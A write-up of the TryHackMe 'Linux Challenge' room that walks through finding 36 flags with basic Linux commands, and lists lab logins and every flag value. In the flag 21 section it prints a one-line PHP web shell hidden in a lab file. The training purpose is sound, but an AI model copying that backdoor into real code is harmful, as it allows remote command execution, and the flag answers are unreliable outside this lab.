# Linux Challenge THM

<https://tryhackme.com/room/linuxctf>

This rooms purpose is to learn or improve your Linux skills.

There will be challenges that will involve you using the following commands and techniques:

    Using commands such as: ls, grep, cd, tail, head, curl, strings, tmux, find, locate, diff, tar, xxd
    Understanding cronjobs, MOTD's and system mounts
    SSH'ing to other users accounts using a password and private key
    Locating files on the system hidden in different directories
    Encoding methods (base64, hex)
    MySQL database interaction
    Using SCP to download a file
    Understanding Linux system paths and system variables
    Understanding file permissions
    Using RDP for a GUI

Deploy the virtual machine attached to this task to get started. 

=====================

#### Task 1
Deploy the virtual machine.

If you want to manually SSH into the machine, use the following credentials:

Username: garry
Password: letmein

How many visible files can you see in garrys home directory?

Via ssh we can log right into this box:
```bash
$ ssh garry@10.X.X.X
garry@10.10.123.165's password:
garry@ip-10-10-123-165:~$ ls
flag1.txt  flag24  flag29
```
So we have three regular files.

#### Task 2
This set of tasks will go over the basic linux commands.

Each question might require you to switch between another user to find the answer!

**What is flag 1?**
```bash
cat flag1.txt 
There are flags hidden around the file system, its your job to find them.

Flag 1: f40dc0cff080ad38a6ba9a1c2c038b2c

Log into bobs account to get flag 2.

Username: bob
Password: linuxrules
```

**Log into bob's account using the credentials shown in flag 1.

What is flag 2?**

```bash
garry@ip-10-10-123-165:~$ su bob
Password: 
bob@ip-10-10-123-165:/home/garry$ cd
bob@ip-10-10-123-165:~$ ls
Desktop    Downloads  flag21.php  flag8.tar.gz  Pictures  Templates
Documents  flag13     flag2.txt   Music         Public    Videos
bob@ip-10-10-123-165:~$ cat flag2.txt 
Flag 2: 8e255dfa51c9cce67420d2386cede596
```

**Flag 3 is located where bob's bash history gets stored.**
```bash
bob@ip-10-10-123-165:~$ cat .bash_history 
9daf3281745c2d75fc6e992ccfdedfcd
cat ~/.bash_history
...
```

**Flag 4 is located where cron jobs are created.**

```bash
bob@ip-10-10-123-165:~$ crontab -e
# m h  dom mon dow   command

0 6 * * * echo 'flag4:dcd5d1dcfac0578c99b7e7a6437827f3' > /home/bob/flag4.txt
```

**Find and retrieve flag 5.**

```bash
bob@ip-10-10-123-165:~$ find / -name flag5.txt 2>/dev/null
/lib/terminfo/E/flag5.txt
bob@ip-10-10-123-165:~$ cat /lib/terminfo/E/flag5.txt 
bd8f33216075e5ba07c9ed41261d1703
```

**"Grep" through flag 6 and find the flag. The first 2 characters of the flag is c9.**

```bash
bob@ip-10-10-123-165:~$ find / -name flag6.txt 2>/dev/null
/home/flag6.txt
bob@ip-10-10-123-165:~$ egrep  "c9+" /home/flag6.txt
.... c9e142a1e25b24a837b98db589b08be5 ...
```

**Look at the systems processes. What is flag 7.**

```bash
bob@ip-10-10-123-165:~$ ps -aux | grep flag7
root      1389  0.0  0.0   6008   644 ?        S    11:48   0:00 flag7:274adb75b337307bd57807c005ee6358 1000000
bob       2680  0.0  0.1  12944  1084 pts/1    S+   12:22   0:00 grep --color=auto flag7
```

**De-compress and get flag 8.**

```bash
tar xfv flag8.tar.gz 
flag8.txt
bob@ip-10-10-123-165:~$ cat flag8.txt 
75f5edb76fe98dd5fc9f577a3f5de9bc
```

**By look in your hosts file, locate and retrieve flag 9.**

```bash
bob@ip-10-10-123-165:~$ cat /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

127.0.0.1	dcf50ad844f9fe06339041ccc0d6e280.com
```

**Find all other users on the system. What is flag 10.**

```bash
bob@ip-10-10-123-165:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash
5e23deecfe3a7292970ee48ff1b6d00c:x:1002:1002:,,,:/home/5e23deecfe3a7292970ee48ff1b6d00c:/bin/bash
alice:x:1003:1003:,,,:/home/alice:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
xrdp:x:113:118::/var/run/xrdp:/bin/false
whoopsie:x:114:120::/nonexistent:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
avahi-autoipd:x:116:122:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
colord:x:117:125:colord colour management daemon,,,:/var/lib/colord:/bin/false
geoclue:x:118:126::/var/lib/geoclue:/bin/false
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:120:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:121:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:122:127:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:123:129:RealtimeKit,,,:/proc:/bin/false
saned:x:124:130::/var/lib/saned:/bin/false
usbmux:x:125:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
garry:x:1004:1006:,,,:/home/garry:/bin/bash
```

#### Task 3

Now we have used the basic Linux commands to find the first 10 flags, we will move onto using more functions that Linux has to offer.

Update: alice's private ssh key doesn't work. Her password is: TryHackMe123

**Run the command flag11. Locate where your command alias are stored and get flag 11.**

```bash
vim .bashrc
...
#custom alias
alias flag11='echo "You need to look where the alias are created..."' #b4ba05d85801f62c4c0d05d3a76432e0
...
```

**Flag12 is located were MOTD's are usually found on an Ubuntu OS. What is flag12?**

```bash
alice@ip-10-10-123-165:/home/bob$ cat /etc/update-motd.d/00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
	# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

# Flag12: 01687f0c5e63382f1c9cc783ad44ff7f

cat logo.txt
```

**Find the difference between two script files to find flag 13.**

```bash
alice@ip-10-10-123-165:~$ find / -name flag13 2>/dev/null
alice@ip-10-10-123-165:~$ diff /home/bob/flag13/script1 /home/bob/flag13/script2
2437c2437
< Lightoller sees Smith walking stiffly toward him and quickly goes to him. He yells into the Captain's ear, through cupped hands, over the roar of the steam... 
---
> Lightoller sees 3383f3771ba86b1ed9ab7fbf8abab531 Smith walking stiffly toward him and quickly goes to him. He yells into the Captain's ear, through cupped hands, over the roar of the steam... 
```

**Where on the file system are logs typically stored? Find flag 14.**

```bash
alice@ip-10-10-123-165:~$ ls /var/log/
alice@ip-10-10-123-165:~$ cat /var/log/flagtourteen.txt
#OR
alice@ip-10-10-123-165:~$ tail -n 1 /var/log/flagtourteen.txt
71c3a8ad9752666275dadf62a93ef393
```

**Can you find information about the system, such as the kernel version etc.
Find flag 15.**

A bit trick as uname doesn't solve it and neither os-release or lsb_release.

```bash
alice@ip-10-10-123-165:~$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

alice@ip-10-10-123-165:~$ cat /etc/*release
FLAG_15=a914945a4b2b5e934ae06ad6f9c6be45
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.5 LTS"
NAME="Ubuntu"
VERSION="16.04.5 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.5 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

**Flag 16 lies within another system mount.**

Thank god for autocompletion! :=)

```bash
alice@ip-10-10-123-165:~$ ls -l /media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6/test.txt 
-rw-r--r-- 1 root root 28 Feb 18  2019 /media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6/test.txt
alice@ip-10-10-123-165:~$ cat /media/f/l/a/g/1/6/is/cab4b7cae33c87794d82efa1e7f834e6/test.txt 
Where does this link to ey?
```

**Login to alice's account using her private key and get flag 17.**

```bash
alice@ip-10-10-123-165:~$ cat flag17 
89d7bce9d0bab49e11e194b54a601362
```

**Find the hidden flag 18**

```bash
alice@ip-10-10-123-165:~$ cat .flag18 
c6522bb26600d30254549b6574d2cef2
```

**Read the 2345th line of the file that contains flag 19.**

```bash
alice@ip-10-10-123-165:~$ sed '2345!d' flag19
490e69bd1bf3fc736cce9ff300653a3b
```
#### Task 4

This set of tasks will require you to understand how certain data is represented on a Linux system. This section may require you to do some independent research.

**Find and retrieve flag 20.**

```bash
alice@ip-10-10-123-165:~$ find / -name flag20 2>/dev/null 
/home/alice/flag20
alice@ip-10-10-123-165:~$ cat flag20
MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg=
alice@ip-10-10-123-165:~$ echo MDJiOWFhYjhhMjk5NzBkYjA4ZWM3N2FlNDI1ZjZlNjg= | base64 -d
02b9aab8a29970db08ec77ae425f6e68
```

**Inspect the flag21.php file. Find the flag.**

```bash
alice@ip-10-10-123-165:~$ find / -name flag21.php 2>/dev/null 
/home/bob/flag21.php
alice@ip-10-10-123-165:~$ cat /home/bob/flag21.php
<?='MoreToThisFileThanYouThink';?>
```
via vim or less we get the flag:

```bash
<?=`$_POST[flag21_g00djob]`?>^M<?='MoreToThisFileThanYouThink';?>
```

**Locate and read flag 22. Its represented as hex.**

```bash
alice@ip-10-10-123-165:~$ find / -name flag22 2>/dev/null 
/home/alice/flag22
alice@ip-10-10-123-165:~$ cat flag22 
39 64 31 61 65 38 64 35 36 39 63 38 33 65 30 33 64 38 61 38 66 36 31 35 36 38 61 30 66 61 37 6
```
As there are no x leading the hex values hexdump does not work out of the box, so use xxd instead.

```bash
alice@ip-10-10-123-165:~$ hexdump -C flag22
00000000  33 39 20 36 34 20 33 31  20 36 31 20 36 35 20 33  |39 64 31 61 65 3|
00000010  38 20 36 34 20 33 35 20  33 36 20 33 39 20 36 33  |8 64 35 36 39 63|
00000020  20 33 38 20 33 33 20 36  35 20 33 30 20 33 33 20  | 38 33 65 30 33 |
00000030  36 34 20 33 38 20 36 31  20 33 38 20 36 36 20 33  |64 38 61 38 66 3|
00000040  36 20 33 31 20 33 35 20  33 36 20 33 38 20 36 31  |6 31 35 36 38 61|
00000050  20 33 30 20 36 36 20 36  31 20 33 37 20 36 34 0a  | 30 66 61 37 64.|
00000060
alice@ip-10-10-123-165:~$ xxd -r -p flag22 
9d1ae8d569c83e03d8a8f61568a0fa7d
```

**Locate, read and reverse flag 23.**

```bash
alice@ip-10-10-123-165:~$ cat flag23 
5ffb258330b8437a090c4f66507925ae
alice@ip-10-10-123-165:~$ rev flag23
ea52970566f4c090a7348b033852bff5
```

**Analyse the flag 24 compiled C program. Find a command that might reveal human readable strings when looking in the source code.**

```bash
alice@ip-10-10-123-165:~$ find / -name flag24 2>/dev/null
/home/garry/flag24
alice@ip-10-10-123-165:~$ file /home/garry/flag24
/home/garry/flag24: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d88e59a01b68aa0969e59bb68726cd7bf8ded9bf, not stripped
alice@ip-10-10-123-165:~$ strings /home/garry/flag24
...
flag_24_is_hidd3nStr1ng
...
```

**Find flag 26 by searching the all files for a string that begins with 4bceb and is 32 characters long.**

```bash
alice@ip-10-10-123-165:~$ find / -xdev -type f -print0 2>/dev/null | xargs -0 grep -E ‘^[a-z0–9]{32}$’ 2>/dev/null
```

**Locate and retrieve flag 27, which is owned by the root user.**

```bash
alice@ip-10-10-123-165:~$ sudo -l
Matching Defaults entries for alice on ip-10-10-123-165.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ip-10-10-123-165.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /bin/cat /home/flag27
alice@ip-10-10-123-165:~$ sudo cat /home/flag
flag27     flag6.txt  
alice@ip-10-10-123-165:~$ sudo cat /home/flag27 
6fc0c805702baebb0ecc01ae9e5a0db5
```

**Whats the linux kernel version?**

```bash
alice@ip-10-10-123-165:~$ uname -a
Linux ip-10-10-123-165 4.4.0-1075-aws #85-Ubuntu SMP Thu Jan 17 17:15:12 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

**Find the file called flag 29 and do the following operations on it:**

 1. Remove all spaces in file.
 2. Remove all new line spaces.
 3. Split by comma and get the last element in the split.

```bash
alice@ip-10-10-123-165:~$ find / -name flag29 2>/dev/null 
/home/garry/flag29
alice@ip-10-10-123-165:~$ cat /home/garry/flag29 | tr -d " \n"
...
fastidiisuscipitmeaei
```

#### Task 5

This task will have you finding flags in an SQL database, downloading files from the file system to your local system and more!

**Use curl to find flag 30.**

```bash
alice@ip-10-10-123-165:~$ curl 10.10.123.165
flag30:fe74bb12fe03c5d8dfc245bdd1eae13f
```

**Flag 31 is a MySQL database name.**

 * MySQL username: root
 * MySQL password: hello

```bash
alice@ip-10-10-123-165:~$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
mysql> show databases;
+-------------------------------------------+
| Database                                  |
+-------------------------------------------+
| information_schema                        |
| database_2fb1cab13bf5f4d61de3555430c917f4 |
| mysql                                     |
| performance_schema                        |
| sys                                       |
+-------------------------------------------+
5 rows in set (0.02 sec)
```

**Bonus flag question, get data out of the table from the database you found above!**

```bash
mysql> show databases;
+-------------------------------------------+
| Database                                  |
+-------------------------------------------+
| information_schema                        |
| database_2fb1cab13bf5f4d61de3555430c917f4 |
| mysql                                     |
| performance_schema                        |
| sys                                       |
+-------------------------------------------+
5 rows in set (0.02 sec)

mysql> use database_2fb1cab13bf5f4d61de3555430c917f4
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------------------------------------+
| Tables_in_database_2fb1cab13bf5f4d61de3555430c917f4 |
+-----------------------------------------------------+
| flags                                               |
+-----------------------------------------------------+
1 row in set (0.00 sec)

mysql> select * from flags;
+----+----------------------------------+
| id | flag                             |
+----+----------------------------------+
|  1 | ee5954ee1d4d94d61c2f823d7b9d733c |
+----+----------------------------------+
1 row in set (0.00 sec)
```

**Flag 33 is located where your personal $PATH's are stored.**

```bash
alice@ip-10-10-123-165:~$ cat .profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin directories
PATH="$HOME/bin:$HOME/.local/bin:$PATH
alice@ip-10-10-123-165:~$ cat /home/bob/.profile 
#Flag 33: 547b6ceee3c5b997b625de99b044f5cf

# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin directories
PATH="$HOME/bin:$HOME/.local/bin:$PATH"
```
**Switch your account back to bob. Using system variables, what is flag34?**

```bash
bob@ip-10-10-123-165:/home/alice$ $PATH
bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games: No such file or directory
bob@ip-10-10-123-165:/home/alice$ printenv 
XDG_SESSION_ID=2
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.8.55.124 51098 22
SSH_TTY=/dev/pts/1
USER=bob
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
MAIL=/var/mail/bob
PWD=/home/alice
LANG=en_US.UTF-8
flag34=7a88306309fe05070a7c5bb26a6b2def
HOME=/home/bob
SHLVL=4
LOGNAME=bob
LC_CTYPE=en_US.UTF-8
SSH_CONNECTION=10.8.55.124 51098 10.10.123.165 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/1004
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/printenv
```

**Look at all groups created on the system. What is flag 35?**

```bash
bob@ip-10-10-123-165:/home/alice$ groups
bob hacker
bob@ip-10-10-123-165:/home/alice$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,ubuntu
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:ubuntu
fax:x:21:
voice:x:22:
cdrom:x:24:ubuntu
floppy:x:25:ubuntu
tape:x:26:
sudo:x:27:ubuntu
audio:x:29:ubuntu,pulse
dip:x:30:ubuntu
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:ubuntu
sasl:x:45:
plugdev:x:46:ubuntu
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
input:x:106:
crontab:x:107:
syslog:x:108:
netdev:x:109:ubuntu
lxd:x:110:ubuntu
messagebus:x:111:
uuidd:x:112:
ssh:x:113:
mlocate:x:114:
admin:x:115:
ubuntu:x:1000:
bob:x:1001:
ssl-cert:x:116:
5e23deecfe3a7292970ee48ff1b6d00c:x:1002:
alice:x:1003:
mysql:x:117:
hacker:x:1004:bob
xrdp:x:118:
lpadmin:x:119:
whoopsie:x:120:
avahi:x:121:
avahi-autoipd:x:122:
bluetooth:x:123:
scanner:x:124:saned
colord:x:125:
geoclue:x:126:
pulse:x:127:
pulse-access:x:128:
rtkit:x:129:
saned:x:130:
gdm:x:131:
flag35_769afb6:x:1005:
garry:x:1006:
```

**Find the user which is apart of the "hacker" group and read flag 36.**

```bash
bob@ip-10-10-123-165:/home/alice$ cat /etc/group | grep hacker
hacker:x:1004:bob
bob@ip-10-10-123-165:/home/alice$ find / -name flag36 2>/dev/null 
/etc/flag36
bob@ip-10-10-123-165:/home/alice$ cat /etc/flag36 
83d233f2ffa388e5f0b053848caed1eb
```
EOF
